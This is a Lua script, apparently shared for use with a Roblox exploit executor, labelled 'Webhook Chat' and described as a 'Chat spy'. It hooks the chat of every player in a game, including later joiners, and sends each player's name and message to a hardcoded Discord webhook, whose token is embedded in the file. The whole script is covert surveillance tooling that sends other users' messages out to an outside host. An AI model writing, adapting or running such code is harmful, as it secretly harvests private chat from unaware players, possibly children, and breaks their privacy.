--[[
	id: Wxz8nTC0dKs7nu8W_IUsl
	name: Webhook Chat
	description: chat Logs/ Chat spy LOL
	time1: 2021-06-08 19:13:49.5176+00
	time2: 2021-06-08 19:13:49.5176+00
	uploader: zkQJINTYCDokkDV276l6h04UTvZ3b1g9vEM2bZEA
	uploadersession: oLDDs6qN1DyMc4MHnCsVi1RR8HkEuI
	flag: f
--]]

local wh =
    "https://discord.com/api/webhooks/851848416572604447/5j6nNIg7QBJnsTeGEKthlbWDvA8AGg7DrNdv7kvIuSHNfW1MXLkltl15qISGb9EEA-YL"

local embed1 = {
    ["title"] = "Beginning of Message logs on " .. game.PlaceId .. " at " .. tostring(os.date("%m/%d/%y"))
}
local a =
    syn.request(
    {
        Url = wh,
        Headers = {["Content-Type"] = "application/json"},
        Body = game:GetService("HttpService"):JSONEncode({["embeds"] = {embed1}, ["content"] = ""}),
        Method = "POST"
    }
)
function logMsg(Webhook, Player, Message)
    local embed = {
        ["description"] = Player .. ": " .. Message
    }
    local a =
        syn.request(
        {
            Url = Webhook,
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode({["embeds"] = {embed}, ["content"] = ""}),
            Method = "POST"
        }
    )
end
for i, v in pairs(game.Players:GetPlayers()) do
    v.Chatted:Connect(
        function(msg)
            logMsg(wh, v.Name, msg)
        end
    )
end

game.Players.PlayerAdded:Connect(
    function(plr)
        plr.Chatted:Connect(
            function(msg)
                logMsg(wh, plr.Name, msg)
            end
        )
    end
)
